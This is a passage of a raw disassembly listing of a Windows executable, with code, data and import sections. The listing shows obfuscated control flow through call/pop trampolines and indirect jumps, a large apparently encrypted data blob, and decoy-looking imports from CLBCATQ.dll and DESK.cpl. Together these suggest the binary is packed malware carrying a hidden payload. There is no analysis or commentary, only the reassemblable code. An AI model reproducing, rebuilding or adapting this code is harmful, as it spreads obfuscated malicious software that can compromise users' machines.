		mov	edx, 4BA05Ch
		add	[edx+264h], edi
		push	edx
		mov	ebx, 0
		push	ebx
		rep call sub_401F13
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_401EEC	endp


; =============== S U B	R O U T	I N E =======================================


sub_401F13	proc near		; CODE XREF: sub_401EEC+1Ap
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	edi
		push	ebx
		call	sub_401114
		add	esp, 8
		pop	edx
		push	edx
		mov	esi, 0
		push	esi
		rep call sub_401F37
		mov	eax, ds:PulseEvent
		jmp	eax
sub_401F13	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401F37	proc near		; CODE XREF: sub_401F13+17p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 54h
		pop	ebp
		retn	0
sub_401F37	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401F44	proc near		; CODE XREF: sub_4012CC+7p

var_18		= dword	ptr -18h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		lea	ecx, [edi+9Ch]
		adc	esi, [ebp+var_18]
		push	ecx
		rep call sub_401F63
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_401F44	endp


; =============== S U B	R O U T	I N E =======================================


sub_401F63	proc near		; CODE XREF: sub_401F44+12p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+35Ch]
		push	eax
		push	dword ptr [ecx+2C4h]
		push	dword ptr [ecx+0D8h]
		call	sub_4015E0
		add	esp, 10h
		pop	ecx
		push	ecx
		push	0
		rep call sub_401F94
		mov	eax, ds:LocalFree
		jmp	eax
sub_401F63	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_401F94	proc near		; CODE XREF: sub_401F63+24p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 34h
		pop	ebp
		retn	0
sub_401F94	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 0C1h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_402060	proc near		; CODE XREF: sub_4011E8+12p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		lea	edi, [ebx+23Ch]
		mov	dword ptr [edi-1D4h], 0FFFFC4FAh
		push	edi
		push	ebx
		push	dword ptr [edi+40h]
		push	dword ptr [edi+128h]
		call	sub_401D14
		add	esp, 0Ch
		pop	edi
		push	0
		rep call sub_40209B
		mov	eax, ds:IsWindow
		jmp	eax
sub_402060	endp


; =============== S U B	R O U T	I N E =======================================


sub_40209B	proc near		; CODE XREF: sub_402060+2Ep
		pop	ecx
		call	ecx
		mov	eax, 0
		push	eax
		rep call sub_4020B1
		mov	eax, ds:IsWindow
		jmp	eax
sub_40209B	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_4020B1	proc near		; CODE XREF: sub_40209B+9p
		pop	ecx
		call	ecx
		add	esp, 34h
		pop	ebp
		retn	0
sub_4020B1	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
		dd 752A1054h, 0E647BEAh, 0D7D4E8D4h, 1A5D3F19h,	481880BAh
		dd 0A638275Eh, 37163B34h, 0A3E5B0A2h, 0D5446E48h, 0D1EB38B7h
		dd 91DF3CA8h, 5C3F4DE9h
		db 0F1h, 7Eh
word_4020EE	dw 0E250h		; DATA XREF: sub_40133E+19o
		dd 15C616B5h, 779CF4A5h, 5207DF24h, 202769B3h, 45F00CAAh
		dd 0E185DC09h, 1DA606BFh, 72ACFCA0h, 2C9292EAh,	98E8E9F7h
		dd 0B4F7F768h, 260554A3h, 0F25E8079h, 5F5C96C2h, 520DF7A2h
		dd 0D7F954A7h, 0C0F955B0h, 2089480Fh, 0E546B8F8h, 0EDCB43Dh
		dd 6B7A52E1h, 54C2D692h, 4B8190FDh, 1C279AECh, 5A5B9EF6h
		dd 0C33395CDh, 74E5886Dh, 0B093C4D1h, 9AFC8597h, 7BEA2299h
		dd 17FB5018h, 7DD85747h, 0C5981AE5h, 5E1E0B51h,	5100FABFh
		dd 0DEA3EAA0h, 11180AAFh, 30450A7h, 7F9CDDA5h, 0CE01912Dh
		dd 98F9081Eh, 0BA2835F0h, 0C7DEE507h, 221A763Fh, 4D4FC4E0h
		dd 0B0FC5217h, 0A886D0DCh, 31F47F91h, 6010C037h, 5061A04Fh
		dd 0AF33A5D7h, 0B40E8313h, 266326C3h, 21CDC4F2h, 0C6EA6DABh
		dd 49E0C881h, 0B18EF317h, 0ABE26E8Ch, 7119C8B9h, 4EF7A8DFh
		dd 0EFC522F6h, 9F128E84h, 252B10F6h, 22430296h,	6F46831Fh
		dd 0C8DCBEA0h, 9BE4F120h, 0B01897C5h, 92480489h, 362F54BFh
		dd 4F3C61F6h, 0AF352607h, 24713C87h, 0ED2606B0h, 954508FDh
		dd 72267F4Fh, 0D20539E5h, 4E0C8364h, 51FCD28Fh,	0DECB4DC8h
		dd 25E1E47Bh, 0AF03CE47h, 0AE066067h, 9137448Ch, 38E4624Bh
		dd 0AB199765h, 2D691C71h, 0E1CE71C7h, 0A010C630h, 0B3041C72h
		dd 0B24E4DC1h, 78292BF3h, 0AE3DBB5Dh, 28387355h, 9F3CD2ABh
		dd 5BD4EE6Ah, 0C661142Ah, 2925758Fh, 0B370A690h, 8F798EE0h
		dd 39C3399Bh, 0E49EE51Ah, 8E18E572h, 0B8F38D86h, 2FDCA1B2h
		dd 0D1823B22h, 18BEE679h, 0A4D68C27h, 694B9ECh,	8C1E395h
		dd 54D81A76h, 0E19866DDh, 9BABB791h, 7CAD4843h,	0EA1AE71Ah
		dd 837C8375h, 5B32475Dh, 6928D3B7h, 0D860B624h,	14E84651h
		dd 0B616DCD7h, 0AD6D1AC4h, 92DDC89Ch, 0B7911E28h, 2E103A48h
		dd 4A140750h, 0DF33E4A8h, 923E0DABh, 0B9E151A2h, 0B304572Eh
		dd 0EE21D8F3h, 89EF378Ah, 3087643Ah, 9B0C5207h,	3E5A9ABCh
		dd 9D48B695h, 0B25C5B40h, 1D56D25Fh, 65D80A45h,	0D3A07969h
		dd 9A1A384Ah, 88F23BD5h, 0B1476719h, 7DDBA377h,	4DE87E44h
		dd 0CD8ED154h, 9F6695E1h, 5CC82ACFh, 0B06A768Fh, 921F1509h
		dd 3647C67Fh, 70322916h, 0D8A7707Bh, 0A4F2D352h, 8589CAE3h
		dd 0B27BA03Bh, 27C2D8FDh, 71141381h, 0CAF93ACCh, 9A8361BEh
		dd 27BD9FA0h, 42A04454h, 0BF9B88DEh, 0FA0A99F0h, 5A4C035Bh
		dd 0ABE65451h, 96A19C5Ah, 15729362h, 0E85289DAh, 0B7133116h
		dd 777B9BCAh, 0C557B62Ah, 2C5F24EAh, 6AD06E2Fh,	4B387F73h
		dd 0D168C046h, 984D23ECh, 27DC6E09h, 708A54A9h,	8C4626A6h
		dd 8A2F3DFDh, 3B50656Bh, 3AD7CD5Ah, 339901D6h, 671B837Fh
		dd 24F23E50h, 6EAAE559h, 48AA8D63h, 31A9C5A4h, 9504773Ah
		dd 414F8C8Eh, 0E3C20B81h, 4FD1FF28h, 82FDADD2h,	47F55917h
		dd 5D955299h, 59C957B3h, 61F54308h, 218982C0h, 20BA8EF2h
		dd 70B2B8EFh, 0B029FA88h, 0D8EA52C0h, 149AD707h, 0FA33EB7Ch
		dd 3F60A65h, 8BDAF9CDh,	159ED918h, 0FB08EBCDh, 0E47CFFE2h
		dd 15ACE0D1h, 83A77244h, 4A6F4A12h, 14BBE6DFh, 76A20CA1h
		dd 44AEE597h, 0DEC84734h, 0F283DC65h, 0DDBE11CCh, 92A0FED2h
		dd 0B6866896h, 7548CBB4h, 0FFFFCEB1h, 818018B0h, 3FBFBB8Fh
		dd 6C9EAE38h, 0C96F91AEh, 5CFC3728h, 0D94AA5BCh, 0A1FEB1E2h
		dd 0DCA4AB0Fh, 83236AFCh, 0FAE5D5DAh, 4D9089D7h, 8E439889h
		dd 39E8ECDFh, 79738990h, 53C63B37h, 0B5F2EF1Bh,	268F41C3h
		dd 72A05F1Eh, 20AFD070h, 0EFA797B0h, 2D20BE27h,	3BB30208h
		dd 1CC467BDh, 0F29DCC42h, 40E18E26h, 608F38EFh,	89E0D7D0h
		dd 0BC8F9438h, 0DBD8AA2Bh, 9393AAEEh, 70CE9ED0h, 0C898B0D8h
		dd 0D5C41BDBh, 969DF216h, 6EB97B3Ch, 0C9A342A2h, 27AED2F6h
		dd 4D6BF046h, 5B3A5D68h, 18CD633Eh, 0DCE6D9D9h,	0F10919Eh
		dd 7C6BB789h, 4D22993Ch, 1A7413A7h, 0B94F0BA1h,	2892CC6Bh
		dd 0D4B699CAh, 96A4B4C0h, 389DA8F9h, 9F79577Bh,	3E38ACB7h
		dd 64401EA7h, 9B0B4D29h, 0A7C3DEC7h, 60EEBDA7h,	5333FBEEh
		dd 0BAC805F2h, 26FCC068h, 0E181EC49h, 10CEF1EDh, 0F5238709h
		dd 7AEDC1CFh, 6671CA1Eh, 0AEC71AF1h, 0FE9BD34Ah, 0C8AA196h
		dd 3F45FBAAh, 0C92D527Bh, 9CF556C2h, 72DB53F1h,	0BF1DA660h
		dd 59D9D1C3h, 1C93171Eh, 12DAB8FAh, 3209C0Eh, 0FFEFB6B6h
		dd 992988A4h, 0BFEB3BADh, 89DB8E99h, 3C9E38B3h,	0A206E2F9h
		dd 3EB49B10h, 30310279h, 0DDB774Fh, 7AAAE5BDh, 83398D21h
		dd 9FA69A9Bh, 33CD9F33h, 0B013066h, 0AEFF67CFh,	1380B70Eh
		dd 9315A381h, 0A4A06CAh, 860F529Ah, 40147AF7h, 6080FEC4h
		dd 0D0BF815Eh, 1914FFD5h, 7348D45Bh, 8760CE28h,	3C237E61h
		dd 266F5925h, 0EDC85592h, 26C049BFh, 0D5009E81h, 16001D2Bh
		dd 237463D2h, 0E233367Bh, 8E3AC838h, 0F967A039h, 83203858h
		dd 0FF74E429h, 12FDB5Fh, 74567BB8h, 3D3B2A8Ah, 0B236DD2Bh
		dd 0AAECE769h, 1B14990Fh, 0B36007C9h, 26260385h, 0BD450A93h
		dd 0A947CB0Ah, 0AC0302D0h, 66897E97h, 0DF82C1D8h, 7BBE9F13h
		dd 0E794097Dh, 387C8688h, 14BB3B49h, 0A1FB0CC4h, 0AF2D3D4Eh
		dd 2C416DAEh, 2D4055EDh, 3FB0D462h, 61A834B7h, 153942A4h
		dd 0FAA3E21Eh, 13D25379h, 0F796D6A0h, 5B494AFh,	0FEA5B610h
		dd 3413E7F7h, 33B072FAh, 0CD552CDDh, 0A24A39C4h, 0BFDDD19Eh
		dd 8E7C1730h, 0BDC052F5h, 2D914C84h, 0A41D9434h, 0E27E7B36h
		dd 0F56E2882h, 0E63EBBF1h, 5613F3CAh, 4DB8315Ch, 0C5A65B56h
		dd 0A16D064Ch, 89C65F9Bh, 0A41A5BF5h, 2E5AD66Fh, 40D294D8h
		dd 3595B5FEh, 0E7A5B011h, 0DAE2CE3h, 62A5748Eh,	4FAD46BDh
		dd 2EA8AFF8h, 51AC1224h, 0D8A9F76Eh, 941507B2h,	0B65D7D90h
		dd 7C514137h, 0C3FBB563h, 9F832A12h, 94F2DF6h, 0D0D43A04h
		dd 0D42044A0h, 0CE3D2AB3h, 54BF3755h, 62C0EAEEh, 0C180ECD1h
		dd 5C9FA570h, 804B9A26h, 639B0789h, 3C8B1884h, 2BB88B6Bh
		dd 0D7EA3FF5h, 9893099Fh, 1A70223Bh, 8F07EFF9h,	1B79304h
		dd 0BF31FE60h, 34E9272Ch, 668C23A9h, 4DB9EE2Bh,	0DAA308EAh
		dd 93AE7B8Ah, 0B7A8C23Ah, 0A5AB9EE2h, 0AEAA308Eh, 0B7AAE7B8h
		dd 0FBAA8C23h, 87AAB9F2h, 2D91A306h, 0EBB78881h, 0E3FD4F7Fh
		dd 67260EB6h, 670139EDh, 14h dup(0)
		dd 200h	dup(?)
_text		ends

; Section 2. (virtual address 00003000)
; Virtual size			: 000B7000 ( 749568.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 0004FC00
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 403000h
; BOOL __stdcall LocalUnlock(HLOCAL hMem)
LocalUnlock	dd ?			; DATA XREF: sub_401954+2Fr
					; sub_4019CF+23r
; BOOL __stdcall CloseHandle(HANDLE hObject)
CloseHandle	dd ?			; DATA XREF: sub_4010F1+Fr
					; sub_401114+34r ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
CreateFileA	dd ?
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
GetModuleHandleA dd ?			; DATA XREF: sub_40114F+10r
					; sub_401174+28r ...
; void __stdcall SetLastError(DWORD dwErrCode)
SetLastError	dd ?			; DATA XREF: sub_4011C8+19r
					; sub_401459+22r ...
; BOOL __stdcall SetEvent(HANDLE hEvent)
SetEvent	dd ?			; DATA XREF: sub_40133E+61r
					; sub_4013E4+30r ...
; LPWSTR __stdcall GetCommandLineW()
GetCommandLineW	dd ?			; DATA XREF: sub_401A38+9r
					; sub_401C98+9r ...
; HLOCAL __stdcall LocalFree(HLOCAL hMem)
LocalFree	dd ?			; DATA XREF: sub_4015E0+34r
					; sub_401D14+34r ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
CreateThread	dd ?
; int __stdcall	lstrlenA(LPCSTR	lpString)
lstrlenA	dd ?			; DATA XREF: sub_401060+1Fr
					; sub_401086+23r ...
; BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress)
UnmapViewOfFile	dd ?			; DATA XREF: sub_4012AC+19r
					; sub_4019AC+1Cr ...
; BOOL __stdcall PulseEvent(HANDLE hEvent)
PulseEvent	dd ?			; DATA XREF: sub_4010BC+2Er
					; sub_4016F8+1Ar ...
; DWORD	__stdcall GetTickCount()
GetTickCount	dd ?			; DATA XREF: sub_40141B+Br
					; sub_401A54+28r ...
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
LoadLibraryW	dd ?			; DATA XREF: sub_4012F8+32o
					; sub_4012F8+3Fr ...
; void __stdcall Sleep(DWORD dwMilliseconds)
Sleep		dd ?			; DATA XREF: sub_4012CC+18r
					; sub_401719+2Br
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
GetComputerNameA dd ?
; DWORD	__stdcall GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer)
GetCurrentDirectoryA dd	?
; DWORD	__stdcall GetConsoleTitleA(LPSTR lpConsoleTitle, DWORD nSize)
GetConsoleTitleA dd ?			; DATA XREF: start+Cr
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
GetSystemTime	dd ?
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
HeapCreate	dd ?
		dd 0
;
; Imports from USER32.dll
;
; LRESULT __stdcall DispatchMessageA(const MSG *lpMsg)
DispatchMessageA dd ?
; BOOL __stdcall CheckRadioButton(HWND hDlg, int nIDFirstButton, int nIDLastButton, int	nIDCheckButton)
CheckRadioButton dd ?
; int __stdcall	FillRect(HDC hDC, const	RECT *lprc, HBRUSH hbr)
FillRect	dd ?
; SHORT	__stdcall GetKeyState(int nVirtKey)
GetKeyState	dd ?
; BOOL __stdcall DrawMenuBar(HWND hWnd)
DrawMenuBar	dd ?
; HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y,	int nWidth, int	nHeight, HWND hWndParent, HMENU	hMenu, HINSTANCE hInstance, LPVOID lpParam)
CreateWindowExA	dd ?
; HWND __stdcall GetDlgItem(HWND hDlg, int nIDDlgItem)
GetDlgItem	dd ?
; HWND __stdcall SetFocus(HWND hWnd)
SetFocus	dd ?			; DATA XREF: sub_401E6B+Dr
; BOOL __stdcall DrawEdge(HDC hdc, LPRECT qrc, UINT edge, UINT grfFlags)
DrawEdge	dd ?
; BOOL __stdcall IsWindow(HWND hWnd)
IsWindow	dd ?			; DATA XREF: sub_401438+1Ar
					; sub_401D4F+Dr ...
; BOOL __stdcall GetScrollBarInfo(HWND hwnd, LONG idObject, PSCROLLBARINFO psbi)
GetScrollBarInfo dd ?
; LRESULT __stdcall CallWindowProcA(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
CallWindowProcA	dd ?
; HDC __stdcall	GetDC(HWND hWnd)
GetDC		dd ?			; DATA XREF: sub_40198A+Dr
		dd 0
;
; Imports from CLBCATQ.dll
;
UpdateFromAppChange dd ?
DowngradeAPL	dd ?
SetupOpen	dd ?
CheckMemoryGates dd ?
SetSetupOpen	dd ?
		dd 0
;
; Imports from DESK.cpl
;
InstallScreenSaver dd ?
		dd 0
		dd 3110h, 2 dup(0)
		dd 32F6h, 3000h, 3164h,	2 dup(0)
		dd 33C6h, 3054h, 319Ch,	2 dup(0)
		dd 3428h, 308Ch, 31B4h,	2 dup(0)
		dd 344Ah, 30A4h, 5 dup(0)
		dd 31F2h, 3292h, 3284h,	32AEh, 3210h, 3232h, 31D0h, 32EAh
		dd 3200h, 323Eh, 3220h,	32A0h, 32C2h, 31E2h, 324Ah, 3270h
		dd 32D2h, 31BCh, 3252h,	3262h, 0
		dd 335Eh, 33B2h, 337Ah,	3304h, 3338h, 3326h, 3386h, 3352h
		dd 3346h, 3394h, 3312h,	33A0h, 3372h, 0
		dd 33DEh, 33F4h, 33D2h,	3414h, 3404h, 0
		dd 3434h, 0
		dd 654701B7h, 6E6F4374h, 656C6F73h, 6C746954h, 4165h, 65470188h
		dd 6D6F4374h, 646E616Dh, 656E694Ch, 33D0057h, 64616F4Ch
		dd 7262694Ch, 57797261h, 34F0000h, 61636F4Ch, 6C6E556Ch
		dd 6B636Fh, 724300B7h, 65746165h, 65726854h, 6461h, 65530474h
		dd 73614C74h, 72724574h, 726Fh,	6E5504D7h, 5670616Dh, 4F776569h
		dd 6C694666h, 45A0065h,	45746553h, 746E6576h, 54E0000h
		dd 7274736Ch, 416E656Ch, 4B30000h, 65656C53h, 2790070h
		dd 53746547h, 65747379h, 6D69546Dh, 4F10065h, 70616548h
		dd 61657243h, 6574h, 6547018Eh,	6D6F4374h, 65747570h, 6D614E72h
		dd 4165h, 7243008Ah, 65746165h,	656C6946h, 540041h, 736F6C43h
		dd 6E614865h, 656C64h, 7550039Bh, 4565736Ch, 746E6576h
		dd 1770000h, 4D746547h,	6C75646Fh, 6E614865h, 41656C64h
		dd 1C70000h, 54746547h,	436B6369h, 746E756Fh, 1C00000h
aGetcurrentdire	db 'GetCurrentDirectoryA',0
		align 2
		dw 349h
aLocalfree	db 'LocalFree',0
aKernel32_dll	db 'KERNEL32.dll',0
		align 4
aGetkeystate	db '"',7,'GetKeyState',0
aYGetscrollbari	db 'Y',7,'GetScrollBarInfo',0
		align 2
		dw 652h
aCreatewindowex	db 'CreateWindowExA',0
		dd 724406AEh, 654D7761h, 6142756Eh, 6A80072h, 77617244h
		dd 65676445h, 7110000h,	46746553h, 7375636Fh, 6930000h
		dd 70736944h, 68637461h, 7373654Dh, 41656761h, 7060000h
		dd 44746547h, 6DB0043h,	6C6C6946h, 74636552h, 70C0000h
		dd 44746547h, 7449676Ch, 6D65h,	734907C0h, 646E6957h, 776Fh
		dd 614305FBh, 69576C6Ch, 776F646Eh, 636F7250h, 6260041h
		dd 63656843h, 6461526Bh, 75426F69h, 6E6F7474h, 53550000h
		dd 32335245h, 6C6C642Eh, 1F0000h, 75746553h, 65704F70h
		dd 6006Eh
aUpdatefromappc	db 'UpdateFromAppChange',0
		db    4
		align 2
aDowngradeapl	db 'DowngradeAPL',0
		align 4
		db  1Dh
		align 2
aSetsetupopen	db 'SetSetupOpen',0
		align 4
		db 9,0
aCheckmemorygat	db 'CheckMemoryGates',0
		align 4
aClbcatq_dll	db 'CLBCATQ.dll',0
		db    6
		align 2
aInstallscreens	db 'InstallScreenSaver',0
		align 2
aDesk_cpl	db 'DESK.cpl',0
		align 4
		dd 6Bh dup(0)
		dd 2DA80h dup(?)
_rdata		ends

; Section 3. (virtual address 000BA000)
; Virtual size			: 0000040A (   1034.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00050200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 4BA000h
		dd 14h dup(20202020h)
asc_4BA050	db '                                                                 '
					; DATA XREF: sub_4011C8+8o
		db '                                                                 '
		db '                                              e',0
		db 'f',0
aSaduDll:
		unicode	0, <sadu*dll>,0
		align 4
		dd 8 dup(0)
dword_4BA138	dd 18h dup(0)		; DATA XREF: sub_4010BC+8o
dword_4BA198	dd 1Dh dup(0)		; DATA XREF: sub_4015E0+8o
dword_4BA20C	dd 0Dh dup(0)		; DATA XREF: sub_4012AC+8o
dword_4BA240	dd 2 dup(0)		; DATA XREF: sub_401AA4+8o
dword_4BA248	dd 23h dup(0)		; DATA XREF: sub_401B90+8o
dword_4BA2D4	dd 17h dup(0)		; DATA XREF: sub_401C60+8o
dword_4BA330	dd 24h dup(0)		; DATA XREF: sub_401060+8o
dword_4BA3C0	dd 7 dup(0)		; DATA XREF: sub_401D14+8o
dword_4BA3DC	dd 0			; DATA XREF: sub_401E30+8o
dword_4BA3E0	dd 88h dup(0)		; DATA XREF: sub_401BE0+8o
		align 1000h
_data		ends


		end start
